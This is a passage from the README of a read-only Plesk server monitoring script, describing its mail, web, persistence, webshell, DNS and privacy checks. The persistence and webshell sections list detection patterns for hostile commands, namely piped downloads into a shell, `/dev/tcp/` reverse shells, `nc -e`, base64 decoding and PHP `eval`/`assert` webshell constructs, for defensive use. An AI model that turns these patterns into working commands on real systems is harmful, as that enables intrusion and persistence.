- **Servers running customers' applications:** customers often send mail through their mailbox from a server of their own – a shop, a CRM or ERP system, a website hosted elsewhere, a scanner or backup job – frequently rented from a cloud provider in another country. Such a server logs in from the same address every time, and without an exception every mail from it raises a country alert. Trust exactly that mailbox from that server with `MAIL_TRUSTED_LOGINS="info@example.com=198.51.100.20"` (or a network, `=198.51.100.0/24`) instead of the whole operator in `GEO_TRUSTED_ORGS`: attackers rent from the same clouds. The same mailbox from another address, or another mailbox from that address, still raises the alert. Check first that it really is always the same address, e.g. `zgrep -h 'sasl_username=info@example.com' /var/log/maillog* | grep -o 'client=[^,]*' | sort | uniq -c`.
- **Attack patterns** are counted from the request URL only (method, path, query string), not from POST bodies. A count answered with `200` doesn't mean the attack worked: many applications answer every URL with 200. Treat it as a pointer. The ModSecurity section (Plesk's web application firewall, read from each domain's `error_log`) shows what was actually blocked.
- **Sensitive files:** a probe answered with 200 raises an alert only if the requested file **exists in the document root** (document roots are read from the Plesk database). Otherwise it is listed as "200 without such file", which is typical for catch-all routes. The daily document-root scan finds such files before anyone requests them, and asks the web server whether each one is actually reachable from outside (`HTTP 200`) or blocked. Reachable files are listed one by one and raise an alert. Blocked ones are summarized per domain: they are no leak, but old backups in particular are worth cleaning up.
- **Access & persistence:** after a break-in, attackers make sure they can come back – an SSH key, a new account, a cron job that reinstalls the malware every few minutes, a process mining crypto currency. The script compares these every run with the previous run (`baseline/` in the state directory) and lists each change once. It only reads: nothing is deleted, blocked or stopped.
  - *Alerts* come for a new or changed SSH key, account with a login shell, sudo right, sudoers file, for `/etc/ld.so.preload` (normally the file doesn't exist; rootkits use it to load their code into every program), for an account other than root with UID 0, for a new listening TCP port, for a new public IP address of the server (hourly, so a provider switching on IPv6 is noticed before much mail leaves from an address without reverse DNS and SPF entry; private addresses are listed without alert), for a new cron entry of root or the system (`/etc/crontab`, a new file in `/etc/cron.d`) and a new autostart file, and for any cron job or autostart file with suspicious content: a download piped into a shell (`curl … | sh`), `base64 -d`, `/dev/tcp/` (reverse shell), a program in `/tmp`, `/var/tmp` or `/dev/shm` (in a cron line any path there; in an autostart script only a program started from there – scripts use temporary files), interpreter one-liners (`python -c`, `perl -e`), `nc -e`, known miner names. Writing a log to `/tmp` (`> /tmp/x.log`) doesn't count. The alert quotes the suspicious line. When you change something yourself (Plesk "Scheduled Tasks", a new SSH key, `apt` installing a package with a cron file), you get one alert, and that's it.
  - *Listed without alert:* new cron jobs of customers (subscriptions), changed autostart files (package updates), a changed comment of an existing SSH key (same fingerprint, same access), and everything removed.
  - *Processes* are checked live in every run, without a baseline: a program in `/tmp`, `/var/tmp`, `/dev/shm` or under `/var/www`, a program deleted after it was started (unless an update replaced it – then only a restart is pending), a program that exists only in memory (`memfd`, not for root), and a process whose name looks like a kernel thread (`[kworker/0:1]`) but that has a program file. The alert repeats in every run while the process runs; a monitoring or security agent that uses such tricks on purpose can be excluded with `PERSISTENCE_IGNORE`. In containers without access to `/proc/<pid>/exe` this part is skipped, with a line in the report.
  - *Passwords in cron lines* (`mysqldump -pSecret`, `https://user:pw@…`, `password=…`) are masked in the report and in the baseline.
  - *Not covered:* keys in an `AuthorizedKeysFile` other than `~/.ssh/authorized_keys`, UDP ports, `at` jobs, and anything an attacker with root rights hides on purpose (a rootkit can hide processes and files from every tool on the system – the checks catch the common, automated attacks on web servers, not a targeted one).
- **Webshell scan:** only PHP files changed since the previous scan are checked, so a full plugin update can produce a burst of findings. "Changed" means by file date *or* by inode change time, here and for new PHP files in upload folders: malware likes to set its file date back (PHP `touch()`) to look as old as its neighbours, but the change time can't be forged. The price: after a restore from a backup or a permission repair, the files touched by it are looked at once more. Legitimate plugins rarely use these constructs (`eval(base64_decode(`, `assert($_POST`, calling functions from request parameters, `preg_replace` with `/e`). Check each finding and exclude known-good files with `WEBSHELL_IGNORE`.
- **Mail certificate name:** if your customers enter something other than the server's host name in their mail clients (e.g. `mail.example.com`), set `MAIL_TLS_NAME` to that name. A name mismatch shows up in clients as a certificate warning, and many users click it away.
- **Domain DNS:** "website points elsewhere" is informational: a domain moved to another host, or sits behind a CDN such as Cloudflare. The CAA check only runs for domains whose current certificate comes from Let's Encrypt. The domain blocklists are asked like the IP blocklists (see above, `BLOCKLIST_RESOLVER`).
- **Public resolver for the daily DNS checks** (SPF/DKIM/DMARC, server and domain DNS, HTTPS): on Plesk servers the system resolver often gives wrong answers for these checks. systemd-resolved (`127.0.0.53`) returns no MX/TXT records for the server's own hostname, and a local Plesk BIND may answer from zones that exist in Plesk while the domain's real DNS is hosted elsewhere. These checks therefore ask `1.1.1.1` by default (`MAILAUTH_RESOLVER`; each section says which resolver it asked). If outbound DNS is blocked, set another resolver or `""`. Blocklists are the exception: they refuse public resolvers, so they are asked through the server's own (see *IP blocklists*).
- **SPF/DKIM check** covers every domain with a Plesk mail directory or DKIM key. An **alert** is raised only when the domain's MX points to this server (its users send through this server) **and neither SPF nor DKIM passes**. In that case DMARC fails and mails are likely rejected or marked as spam. If only one of them fails, DMARC still passes, so the domain is listed as a recommendation without an alert. Domains whose mail is hosted elsewhere are listed for information only. **Plesk domain aliases with the mail service switched off** are listed for information only as well (`alias of …, mail off`): nobody can send or receive mail with them on this server, so a missing or failing SPF/DKIM doesn't matter. An SPF record ending in `+all` is still reported, because it lets anyone forge mail from the domain. Aliases with mail switched on are checked like any other domain, since all mailboxes of the primary domain can send under the alias address. SPF evaluation is simplified: `ip4`, `a`, `mx`, `include` and `redirect` are followed (up to 10 levels), `ptr`/`exists`/macros and IPv6 are not. A `fail` therefore means "this server's IPv4 is not covered"; verify with an online SPF checker before contacting the domain owner. DKIM is compared byte for byte: `MISMATCH` usually means the key was regenerated in Plesk but the DNS record (often at an external DNS provider) was not updated. A lookup that gets no answer (timeout or SERVFAIL, even after a retry) is shown as `?` and the domain as *not rated* – never as a missing record and never as an alert; the next daily run checks it again.
- **DB-IP Lite** data is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). The attribution line at the end of every report satisfies this. Country accuracy is high, city data is not used.
- **FTP is not checked:** neither FTP logins nor files uploaded by FTP appear in the report (new PHP files in upload folders and suspicious code are found whatever way they arrived). If nobody needs FTP, close port 21 in the firewall – SFTP over SSH does the same job, and SSH logins are in the report.
- **Failed uploads:** when rclone can't upload (expired token, quota, network), the report that would say so doesn't arrive either. The script remembers the first failure and rclone's message; every following report raises `Script: the upload to … fails since …` – in the local report, by mail if `REPORT_MAIL_TO` is set, and in the upload as soon as it works again. Without mail, missing reports are the signal – the example prompt below tells the AI to treat a gap as a finding.
- **Disk space and inodes:** a filesystem can be "full" with free space left when it runs out of inodes (millions of session files, mails or cache files). Both are checked against `WARN_DISK_PCT`.
- **Safety limits:** the script runs with low CPU and disk priority (`nice`, `ionice`). Every external command that can hang has a time limit (`CMD_TIMEOUT`, `FIND_TIMEOUT`), cron runs as a whole are stopped after `MAX_RUNTIME`, and at most `MAX_LOG_MB` of each log are read per run. Temporary files are kept under `/var/lib/plesk-server-report` instead of `/tmp`, which is in RAM on Debian 13. Nothing fails silently: an aborted run (error, timeout, kill) is reported by the next run with the step it was in, a run that is still hanging after `MAX_RUNTIME` makes the next runs upload a warning report instead of skipping quietly, and missing data sources (mail log, web logs, panel log, Roundcube logs, empty paths in the configuration) appear as ` i ` notes below the STATUS line – as does an IMAP/POP3 server whose log lines are present but whose login format is not recognized (supported: Dovecot and Courier), so its figures are not mistaken for "no failed logins". Details of aborted runs: `journalctl -t plesk-server-report`. Interactive runs from a terminal are not time-limited, so Ctrl-C works.
- The CPU section is a 3-second snapshot, not an average.
- Report timestamps use the server's time zone (`timedatectl` shows it).

---

## Security

- **Found a vulnerability?** Please report it privately, not in a public issue – see [SECURITY.md](SECURITY.md).
- Before the first run, let an AI review the script – see [Check it before you run it as root](#check-it-before-you-run-it-as-root) for a prompt and what it will point out.
- The configuration file (`/etc/plesk-server-report.conf`, or the one next to the script) is loaded as code: keep it owned by root and writable only by root (`chmod 600`). If another user owns it or can write it, the script refuses to run and says why on stderr and in the system log (`journalctl -t plesk-server-report`). A warning in the report would come too late: by then the code in the file would already have run.
- Runs as root because it needs to read all logs (and `/proc`, crontabs, `authorized_keys` for the persistence check). Apart from `--self-update` (below) it changes nothing on the server – no IP is blocked, no process stopped, no file removed; findings are reported, the action is yours. It writes only to its state folder (`/var/lib/plesk-server-report` or `state/` next to the script, mode 700) and, next to the script, to its own files: once the configuration file (first run of a one-folder installation) and `first-report.txt` (in `plesk-server-report-backup/` in the usual layout), and with `--self-update` the kept versions – to the configured rclone remote and – with `REPORT_MAIL_TO` – hands mails to the local `sendmail`.
- Log lines are partly written by attackers – login names, mail addresses, URLs, user agents. The script only reads them as text: tabs and control characters are removed before a check sees a line (no terminal escape sequences in the report, no shifted fields), numbers from state files are checked before the shell computes with them, and nothing from a log is ever run. A test with hostile log lines (`tests/hostile.bats`) checks this on every push.
- External connections: DNS lookups (blocklists, SPF/DKIM, domain DNS), the rclone upload, the report mails (only if `REPORT_MAIL_TO` is at another provider), the daily HTTPS check of your own domains (to this server's IP), the monthly download of the DB-IP Lite database (only with geolocation), and once a day two requests to the GitHub API for the latest releases of the script (`UPDATE_CHECK=0` switches them off). Nothing about your server is sent.
- The script never updates itself on its own. `--self-update` replaces it only when root starts it by hand in a terminal – it refuses to run from cron and in a git checkout. It downloads the script of the newest 1.x release by HTTPS from GitHub (the release tag), checks it without running it (valid bash, the expected version in its `VERSION` line), shows the changes and asks – nothing of the new version runs before you say yes. The previous versions are kept next to the script for `--self-update --rollback` (see [Updates](#updates)). There is no signature for 1.x releases: you trust GitHub and its HTTPS, as with the `curl` command of the installation. Version 2 will be signed; the key to check it is built into 1.12.0 already.
- The rclone config (`/root/.config/rclone/rclone.conf`) contains the token for the storage account. That is another reason to use a dedicated account with the narrowest possible scope (`drive.file`, bucket-limited keys, chrooted SFTP user).

---

## Privacy (GDPR)

The reports and the [state directory](STATE-FILES.md) contain personal data: IP addresses, mailbox addresses, login times, and the country and network operator of an IP. They concern your customers' users, website visitors and attackers. Processing logs to protect a server is usually covered by legitimate interest (Art. 6(1)(f) GDPR; recital 49 names network and information security), but what applies to you depends on your setup. This is not legal advice.

What the script does to keep it small:
- **GeoIP runs locally** (DB-IP Lite database) – no IP is sent anywhere for it.
- **Limited retention:** reports `RETENTION_DAYS` / `LOCAL_KEEP_DAYS` (7 days), client IPs of mail logins `KNOWN_MAIL_IP_DAYS` (30), foreign countries per mailbox `IMAP_COUNTRY_KEEP_DAYS` (30), SSH/Plesk login IPs `KNOWN_LOGIN_IP_DAYS` (90).
- It only reads logs the server writes anyway; it creates no new raw data.

**Which setup, from a GDPR point of view** – from best to weakest:

1. **Local only** (`REMOTE=""`, no `REPORT_MAIL_TO`) – no copy anywhere else, deleted after `LOCAL_KEEP_DAYS`. But nobody is told about a problem unless they log in and read the reports – and monitoring is a security measure in its own right (Art. 32 GDPR).
2. **Mail to a mailbox on this server, no upload** ([Reports by mail](#reports-by-mail)) – no third party either. Additional copies in the mailbox, in the server backups and on the devices that read it – delete old mails regularly. You have to notice yourself when the daily summary doesn't arrive. The best balance for most.
3. **Upload with `MASK_MAILBOXES=1`** – the storage and AI provider get pseudonymised mail addresses, but still IP addresses and domains. Data processing agreements are still needed (see below).
4. **Upload with full addresses** – the most convenient for an AI review, and the most personal data at third parties.

The AI review is the most useful option – and the weakest one for data protection. If you can't name the storage and AI provider in your agreements with your customers, stay with 1 or 2.

**If you upload the reports or let an AI read them**, the storage and the AI provider receive this data. If you host mail or websites for customers, they are typically sub-processors: name them in your data processing agreements with your customers and in your record of processing activities, and use providers that offer a data processing agreement (and, outside the EU, a valid transfer mechanism). **Pseudonymised mailboxes:** with `MASK_MAILBOXES=1` the uploaded reports show every mail address as a pseudonym such as `mbx-4f2a91@example.com`, while the local reports stay complete. The same mailbox always gets the same pseudonym, so the AI can still follow a mailbox across reports and days; the key to compute it stays on your server ([state files](STATE-FILES.md)). When a review names a pseudonym, translate it back on the server:

```bash
plesk-server-report.sh --decode mbx-4f2a91@example.com
plesk-server-report.sh --decode < review.txt     # a whole review, every pseudonym replaced
# an uploaded report, read straight from the upload target (REMOTE) – the local copies in
# /var/lib/plesk-server-report/out are not pseudonymised, they need no decoding
rclone cat reports:server-reports/HOSTNAME/summary.txt | plesk-server-report.sh --decode
rclone cat reports:server-reports/HOSTNAME/report-YYYYMMDD-HHMM.txt | plesk-server-report.sh --decode
```

To see what the AI would get before you switch it on – nothing is uploaded: `plesk-server-report.sh --pseudonymise /var/lib/plesk-server-report/out/summary.txt | less`

Limits: pseudonymised data is still personal data (GDPR Art. 4(5)) – it lowers the risk, the agreements above are still needed. The domain stays visible (needed to tell which customer is affected), and a one-person domain still points to that person. IP addresses are not masked, because the reports need them to tell a customer from an attacker. Bare user names without a domain (attackers often try `office` instead of `office@…`) stay as they are. If your AI prompt lists known exceptions by mailbox, use the pseudonyms there.

---

## Tests

`tests/` holds [bats](https://github.com/bats-core/bats-core) tests and their fixtures: logs of the author's server, anonymized, plus a few made-up lines for cases that server didn't have (other mail setups, a failed backup) – an hour of mail traffic, the cases from [What it found so far](#what-it-found-so-far) (a tablet with an outdated password, refused blocklist lookups, delivery confirmations, a full mailbox, failed certificate renewals), web logs with ModSecurity hits, Plesk panel logins, Roundcube, the Plesk backup log, the output of `fail2ban-client`, `.htaccess` files, mailbox sizes – and a day of the script's own hourly reports, from which the daily summary must come out as on the server. Each test loads the script's functions without running it and points one check at a fixture; nothing outside a temporary directory is touched, no root needed.

```bash
apt install bats            # RHEL family: dnf install bats (EPEL)
bats tests/
```

`tests/anonymize.py` made the fixtures: it replaces domains, mailbox names, IPs, host names and tokens consistently, so the patterns the script looks for survive. Use it if you contribute logs (from a server with another mail setup, say), and read the result before you post it – anonymizing is best effort:

```bash
python3 -I tests/anonymize.py --server-ip <SERVER_IP> --hostname <HOSTNAME> \
  --own-domains domains.txt --out-dir anon/ excerpt.log
```

---

## Rejections by other mail providers? Help wanted

The report names who rejected mail and what to do for the lists and providers it knows (see *Reputation* in [What the report covers](#what-the-report-covers)). Rejections from others are counted and shown as examples, but get no hint yet. If you see one – a rejection without a line under *What to do, by who rejected* – please open an issue with the rejection line from the mail log, anonymized:

```bash
grep -h 'status=bounced\|status=deferred' /var/log/maillog /var/log/mail.log 2>/dev/null | grep -i 'block\|reputation\|spam\|policy' | tail -3 |
  sed -E 's/to=<[^>]*>/to=<user@example.com>/g; s/([0-9]{1,3}\.){3}[0-9]{1,3}/203.0.113.10/g'
```

Check the result before posting: the rejection text itself may contain your domain or host name – replace it with `example.com`. **Issues are public.** The provider's name in the text and any link it gives are what's needed; if you know how its removal works, add that too.

## Using another CMS? Help wanted

Everything except two checks works with any software: mail, blocklists, system, services, fail2ban, 5xx and PHP errors, certificates, backups and geolocation. The two checks below currently understand **WordPress only**, because that is what runs on the author's server:

- **login-attack analysis** (`wp-login.php` / `xmlrpc.php`, detection of successful logins by HTTP status code)
- **PHP files in upload folders** (`wp-content/uploads`)

Other applications popular on Plesk (Joomla, Drupal, TYPO3, PrestaShop, Shopware, Magento, Nextcloud, …) use different login URLs, status codes and upload folders. Guessing them would produce false alarms. Joomla answers a successful login with `303` instead of `302`, for example, and Nextcloud redirects on failed logins too.

Contributions are welcome – the rules (read only, mawk and gawk, tests, no real data) are in [CONTRIBUTING.md](CONTRIBUTING.md).

**If you run one of them, you can help:** open an issue with the template [*Support for another CMS / application*](../../issues/new?template=cms-support.yml). It asks for exactly what is needed:

- software and version, Plesk version, OS
- the login URL of the admin area
- a few **anonymized** access-log lines of a successful login, a failed login and (if available) an attack
- the upload folders and any legitimate PHP files inside them

The template includes a one-line command that anonymizes the log lines (IPs → `203.0.113.x`, domain → `example.com`). **Please never post real IPs, domains or user names. Issues are public.**

---

## License

MIT. Use at your own risk. Contributions, parsers for other log formats and threshold experiences are welcome.
